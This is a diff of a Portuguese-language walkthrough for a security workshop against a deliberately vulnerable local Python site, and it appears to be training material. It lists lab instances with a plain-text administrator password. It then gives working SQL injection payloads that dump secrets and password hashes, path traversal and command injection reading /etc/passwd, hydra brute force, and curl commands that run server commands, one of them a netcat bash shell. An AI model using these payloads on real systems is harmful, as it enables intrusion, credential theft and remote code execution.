@@ -2,31 +2,20 @@
 
 ### Windows
 
-Region: us-east-1
-
-Instance id: This is the Windows client with tools for the Python_SafeSite Security Workshop
-
-AMI name: SecLabClient
-
-Description: This is the Windows client with tools for the Python_SafeSite Security Workshop
-
-Administrator Password: mBp4t;Jvg6!dskzt3DCHa@w7H?l5.?VE
-
-AMI id: ami-01127273b979fe92b
+- Region: us-east-1
+- Instance id: This is the Windows client with tools for the Python_SafeSite Security Workshop
+- AMI name: SecLabClient
+- Description: This is the Windows client with tools for the Python_SafeSite Security Workshop
+- Administrator Password: mBp4t;Jvg6!dskzt3DCHa@w7H?l5.?VE
+- AMI id: ami-01127273b979fe92b
 
 ### Linux
 
-Region: us-east-1
-
-Instance id: i-0458f66b29d690451
-
-AMI name: SecLabServer
-
-Description: This is the Linux server with the vulnerable site for the Python_SafeSite Security Workshop
-
-AMI id: ami-01127273b979fe92b
-
-
+- Region: us-east-1
+- Instance id: i-0458f66b29d690451
+- AMI name: SecLabServer
+- Description: This is the Linux server with the vulnerable site for the Python_SafeSite Security Workshop
+- AMI id: ami-01127273b979fe92b
 
 # Falhas e Ataques
 
@@ -34,18 +23,18 @@ AMI id: ami-01127273b979fe92b
 
 Ao colocar uma aspa dupla (") no campo de busca, o site quebra. Isso mostra que o site é vulnerável a ataques SQL Injection. Um agravante é que o desenvolvedor deixou a página de Debug habilitada, mostrando detalhes do erro e inclusive a engine (SQLite3). Com a informação do SQL é possível compor um ataque que seja adicionado à cláusula where da query:
 
-- Original: 
-  
-  - SELECT * FROM posts WHERE Content LIKE "%"%";
+- Original:
+
+  - `SELECT * FROM posts WHERE Content LIKE "%"%";`
 
 - Alteradas:
-  
-  - SELECT * FROM posts WHERE Content LIKE "%X" union select 1, 2 --%"; 
-    
-    - X" union select 1, 2 --
-    - X" union select name, sql from sqlite_master where type='table' --
-    - X" union select name || ': ' || card, password from secrets --
-    - X" union select login || ': ' || email, password from logins --
+
+  - `SELECT * FROM posts WHERE Content LIKE "%X" union select 1, 2 --%";`
+
+    - `X" union select 1, 2 --`
+    - `X" union select name, sql from sqlite_master where type='table' --`
+    - `X" union select name || ': ' || card, password from secrets --`
+    - `X" union select login || ': ' || email, password from logins --`
 
 Obtivemos os hashes dos logins, que podem ser facilmente quebrados no [https://crackstation.net/](https://crackstation.net/):
 
@@ -72,19 +61,19 @@ a07bda8fd5e39462b4c3d860a36f6b4d
 
 A página Sobre Nós claramente exibe o conteúdo de arquivos texto que estão no servidor. Ao clicar em um deles, a URL fica da seguinte forma:
 
-[http://localhost:8000/about?doc=termo_de_uso](http://localhost:8000/about?doc=termo_de_uso)
+[http://0.0.0.0:8000/about?doc=termo_de_uso](http://0.0.0.0:8000/about?doc=termo_de_uso)
 
 Vamos explorar esse parâmetro:
 
-- ?doc=x: Tela em branco
+- `?doc=x`: Tela em branco
 
-- doc=/etc/passwd: Tela em branco
+- `?doc=/etc/passwd`: Tela em branco
 
 Provavelmente não vemos nada porque esse campo recebe o nome do arquivo e faz prepend de um caminho e append de uma extensão. Logo, termo_de_uso deve virar algo como /pasta/termo_de_uso.txt. Se isso for verdade, podemos testar com diretórios relativos + null bytes e também com múltiplos nomes de arquivos.
 
-- [http://localhost:8000/about?doc=../../../../../etc/passwd%00](http://localhost:8000/about?doc=../../../../../etc/passwd%00)  Quebra por causa do null byte.
-- [http://localhost:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://localhost:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) mostra o conteúdo de todos os arquivos, menos o primeiro e o último.
-- Será que neste contexto ele repassa o path para o shell? Se sim, podemos tentar executar comandos... [http://localhost:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://localhost:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Game over!
+- [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00)  Quebra por causa do null byte.
+- [http://0.0.0.0:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) mostra o conteúdo de todos os arquivos, menos o primeiro e o último.
+- Será que neste contexto ele repassa o path para o shell? Se sim, podemos tentar executar comandos... [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Game over!
 
 #### Contato: CSRF + XSS (Firefox)
 
@@ -103,6 +92,14 @@ Ao criar um usuário, é possível fazer o upload de um arquivo qualquer que nã
 #### Área Restrita: HTTP Brute Force
 
 Com o THC-Hydra, Burp Suite ou OWASP ZAP é possível facilmente quebrar as senhas, já que não há um limitador de tempo.
+
+```
+hydra -V -s 8000 \
+    -l admin -P /opt/wordlists/common_it_passwords.txt \
+    0.0.0.0 \
+    http-post-form \
+    '/login:login=^USER^&senha=^PASS^:Login incorreto!'
+```
 
 #### Perfil: HTTP Brute Force
 
@@ -126,6 +123,26 @@ Ao trocar o cookie e dar refresh, os privilégios da sessão são elevados insta
 
 Como não há nenhum recurso que impeça múltiplos requests sequenciais, ferramentas como o DIRB, o Nikto e o ZAP podem fazer ataques fuzzy ou via listas para encontrar diretórios ocultos.
 
+`dirb http://0.0.0.0:8000/`
+
+Achamos um /status oculto.
+
 #### Status: Form Tampering (or Poisoning)
 
 O diretório /status que só permite a execução de determinados comandos e apenas para o usuário admin, pode ser burlado via troca de parâmetros no request para que comandos sejam enviados diretamente ao servidor.
+
+```
+curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
+    'http://0.0.0.0:8000/status' \
+    -X POST \
+    --data 'cmd=env'
+```
+
+Para subir um shell reverso, caso o servidor tenha Netcat instalado:
+
+```
+curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
+    'http://0.0.0.0:8000/status' \
+    -X POST \
+    --data 'cmd=nc -lvp 8443 -e /bin/bash'
+```
